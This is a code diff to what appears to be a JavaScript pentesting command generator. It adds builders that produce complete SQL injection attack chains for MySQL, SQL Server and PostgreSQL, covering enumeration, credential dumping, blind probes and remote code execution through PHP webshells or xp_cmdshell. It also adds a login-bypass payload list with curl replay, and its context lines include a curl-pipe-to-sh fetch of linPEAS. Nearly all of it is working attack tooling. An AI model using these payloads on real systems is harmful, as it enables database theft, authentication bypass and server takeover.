@@ -41,6 +41,96 @@ profiles['peas-fetch']={
   controls:[{type:'radio',id:'platform',label:'Target platform',default:'linux',options:[{value:'linux',label:'Linux / linPEAS'},{value:'windows',label:'Windows / winPEAS'}]},{type:'arg',id:'port',label:'HTTP server port',default:'80',placeholder:'80'},{type:'toggle',id:'server',label:'Include Kali HTTP server command',default:true}],
   build:(base,p,s)=>{const port=val(p,s,'port','80'),host=p.lhost||'{{lhost}}',prefix=`http://${host}${port==='80'?'':':'+port}`;const cmd=radio(s,'platform','linux')==='windows'?`iwr ${prefix}/winpeas/winPEASany.exe -OutFile C:\\Users\\Public\\w.exe`:`curl ${prefix}/linpeas/linpeas.sh | sh`;return (on(s,'server')?`# Kali\npython3 -m http.server ${port}\n# Target\n`:'')+cmd;}
 };
+// Manual SQLi is an engine-aware tool: pick the DB engine and the builder re-writes every
+// stage in that dialect (fingerprint funcs, schema navigation, string concat, blind/error
+// probes, and the RCE path). Endpoint path / parameter / loot table are engagement args.
+const SQLI_DIALECTS={
+  mysql:{label:'MySQL / MariaDB',ver:'@@version',db:'database()',user:'current_user()',
+    navigate:tbl=>[
+      ['-1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata -- -','all databases'],
+      ['-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -','tables in current DB'],
+      ["-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='"+tbl+"' -- -",'columns of '+tbl]],
+    dump:tbl=>'-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM '+tbl+' -- -',
+    blind:[
+      ['1 AND extractvalue(1,concat(0x7e,(SELECT database()))) -- -','error-based (leaks in the error)'],
+      ["1 AND substring((SELECT database()),1,1)='a' -- -",'blind boolean (char by char)'],
+      ["1 AND IF(substring((SELECT database()),1,1)='a',sleep(3),0) -- -",'blind time (3s delay = true)']],
+    rce:(U,t)=>[
+      'curl -s "'+U+"-1 UNION SELECT 1,'<?php system($_GET[0]);?>',3 INTO OUTFILE '/var/www/html/s.php' -- -"+'"   # needs FILE priv + known webroot',
+      'curl -s "http://'+t+'/s.php?0=id"   # run commands through the webshell']},
+  mssql:{label:'Microsoft SQL Server',ver:'@@version',db:'DB_NAME()',user:'SYSTEM_USER',
+    navigate:tbl=>[
+      ['-1 UNION SELECT 1,name,3 FROM master..sysdatabases -- -','all databases (one row per request)'],
+      ['-1 UNION SELECT 1,table_name,3 FROM information_schema.tables -- -','tables (one per request)'],
+      ["-1 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='"+tbl+"' -- -",'columns of '+tbl]],
+    dump:tbl=>"-1 UNION SELECT 1,CONCAT(username,':',password),3 FROM "+tbl+' -- -   (one row per request)',
+    blind:[
+      ['1 AND 1=CONVERT(int,@@version) -- -','error-based (leaks in the convert error)'],
+      ["1; IF (ASCII(SUBSTRING((SELECT DB_NAME()),1,1))=97) WAITFOR DELAY '0:0:3' -- -",'blind time (stacked; 3s = char is a)']],
+    rce:(U,t)=>[
+      'curl -s "'+U+"1; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami' -- -"+'"   # enable + run xp_cmdshell (needs sysadmin)']},
+  postgres:{label:'PostgreSQL',ver:'version()',db:'current_database()',user:'current_user',
+    navigate:tbl=>[
+      ["-1 UNION SELECT 1,string_agg(datname,','),3 FROM pg_database -- -",'all databases'],
+      ["-1 UNION SELECT 1,string_agg(table_name,','),3 FROM information_schema.tables WHERE table_schema='public' -- -",'tables in public schema'],
+      ["-1 UNION SELECT 1,string_agg(column_name,','),3 FROM information_schema.columns WHERE table_name='"+tbl+"' -- -",'columns of '+tbl]],
+    dump:tbl=>"-1 UNION SELECT 1,string_agg(username||':'||password,','),3 FROM "+tbl+' -- -',
+    blind:[
+      ['1 AND 1=CAST((SELECT version()) AS int) -- -','error-based (leaks in the cast error)'],
+      ["1 AND substr((SELECT current_database()),1,1)='a' -- -",'blind boolean'],
+      ['1 AND 1=(SELECT 1 FROM pg_sleep(3)) -- -','time probe (unconditional 3s; wrap in CASE for boolean-time)']],
+    rce:(U,t)=>[
+      'curl -s "'+U+"1; COPY (SELECT '<?php system($_GET[0]);?>') TO '/var/www/html/s.php' -- -"+'"   # write webshell via COPY (needs superuser)',
+      'curl -s "http://'+t+'/s.php?0=id"   # run commands through the webshell']}
+};
+profiles['manual-sqli']={
+  controls:[
+    {type:'radio',id:'engine',label:'Database engine',default:'mysql',options:[{value:'mysql',label:'MySQL / MariaDB'},{value:'mssql',label:'MS SQL Server'},{value:'postgres',label:'PostgreSQL'}]},
+    {type:'arg',id:'path',label:'Endpoint path',default:'page.php',placeholder:'page.php'},
+    {type:'arg',id:'param',label:'Injected parameter',default:'id',placeholder:'id'},
+    {type:'arg',id:'table',label:'Table to loot',default:'users',placeholder:'users'},
+    {type:'toggle',id:'detect',label:'Detect + column count',default:true},
+    {type:'toggle',id:'navigate',label:'UNION fingerprint + navigate DB',default:true},
+    {type:'toggle',id:'extract',label:'Extract / dump rows',default:true},
+    {type:'toggle',id:'blind',label:'Error / blind fallbacks',default:false},
+    {type:'toggle',id:'rce',label:'RCE stage',default:false}
+  ],
+  build:(base,p,s)=>{
+    const t=val(p,s,'target',p.target||'{{target}}'),path=val(p,s,'path','page.php'),prm=val(p,s,'param','id'),tbl=val(p,s,'table','users');
+    const E=SQLI_DIALECTS[radio(s,'engine','mysql')]||SQLI_DIALECTS.mysql;
+    const U='http://'+t+'/'+path+'?'+prm+'=';
+    const q=(v,c)=>'curl -s "'+U+v+'"'+(c?'   # '+c:'');
+    const out=['# '+E.label+' dialect — every request issued by hand'];
+    if(on(s,'detect')){out.push('# ---- STAGE 0 · Detect + column count ----',q("1'",'error / changed page = candidate'),q('1 AND 1=1 -- -','true  -> normal page'),q('1 AND 1=2 -- -','false -> different/empty page'),q('1 ORDER BY 1 -- -','bump 2,3,... last that works = column count'));}
+    if(on(s,'navigate')){out.push('# ---- STAGE 1 · UNION fingerprint + navigate the DB (N = column count) ----',q('-1 UNION SELECT 1,2,3 -- -','which columns echo?'),q('-1 UNION SELECT 1,'+E.ver+','+E.db+' -- -','engine + current DB'),q('-1 UNION SELECT 1,'+E.user+',3 -- -','current user'));for(const l of E.navigate(tbl))out.push(q(l[0],l[1]));}
+    if(on(s,'extract')){out.push('# ---- STAGE 2 · Extract / dump rows ----',q(E.dump(tbl),'dump rows from '+tbl));}
+    if(on(s,'blind')){out.push('# ---- STAGE 3 · Error / blind fallbacks (UNION blocked) ----');for(const l of E.blind)out.push(q(l[0],l[1]));}
+    if(on(s,'rce')){out.push('# ---- STAGE 4 · RCE (only where engine + privileges allow — the --os-shell equivalent) ----');for(const l of E.rce(U,t))out.push(l);}
+    return out.join('\n');
+  }
+};
+const SQLI_LOGIN_PAYLOADS="# ---- Log in as the FIRST user (usually admin) ----\nadmin' -- -\nadmin' #\nadministrator' -- -\n' OR 1=1 -- -\n' OR 1=1 LIMIT 1 -- -\n\n# ---- OR-true (username not matched against a real row) ----\n' OR '1'='1' -- -\n' OR '1'='1\n\" OR \"1\"=\"1\" -- -\n') OR ('1'='1' -- -\nadmin') -- -";
+profiles['sqli-login']={
+  controls:[
+    {type:'arg',id:'path',label:'Login endpoint',default:'login.php',placeholder:'login.php'},
+    {type:'arg',id:'userfield',label:'Username field name',default:'username',placeholder:'username'},
+    {type:'arg',id:'passfield',label:'Password field name',default:'password',placeholder:'password'},
+    {type:'radio',id:'inject',label:'Inject into',default:'username',options:[{value:'username',label:'Username field'},{value:'password',label:'Password field'}]},
+    {type:'toggle',id:'curl',label:'Include curl replay',default:true},
+    {type:'toggle',id:'burp',label:'Include Burp Intruder note',default:true}
+  ],
+  build:(base,p,s)=>{
+    const t=val(p,s,'target',p.target||'{{target}}'),path=val(p,s,'path','login.php'),uf=val(p,s,'userfield','username'),pf=val(p,s,'passfield','password');
+    const injPass=radio(s,'inject','username')==='password';
+    const out=['# Paste a payload into the '+(injPass?'PASSWORD':'USERNAME')+' field (other field = anything).','# Success = a redirect, a Set-Cookie session, an authenticated page, or a response','# length different from the "invalid credentials" baseline. Try each comment style.','',SQLI_LOGIN_PAYLOADS];
+    if(on(s,'curl')){
+      const uval=injPass?'valid_or_any':"admin' -- -",pval=injPass?"' OR 1=1 -- -":'x';
+      out.push('','# ---- Replay the login POST with curl ----','curl -s -i -X POST "http://'+t+'/'+path+'" \\','  --data-urlencode "'+uf+'='+uval+'" \\','  --data-urlencode "'+pf+'='+pval+'"');
+    }
+    if(on(s,'burp')){out.push('','# ---- Spray the whole list with Burp Intruder ----','# Send the login request to Intruder, mark ONLY the '+(injPass?pf:uf)+' value as the','# payload position, load these strings as a Simple list, then sort by status / length.');}
+    return out.join('\n');
+  }
+};
 for(const s of root.OBOL_SCRIPTS||[]){if(profiles[s.id])s.builder25=profiles[s.id];}
 root.OBOL_SCRIPT_BUILDERS_V25={version:'2.5.0',profiles};
 })(typeof window!=='undefined'?window:globalThis);
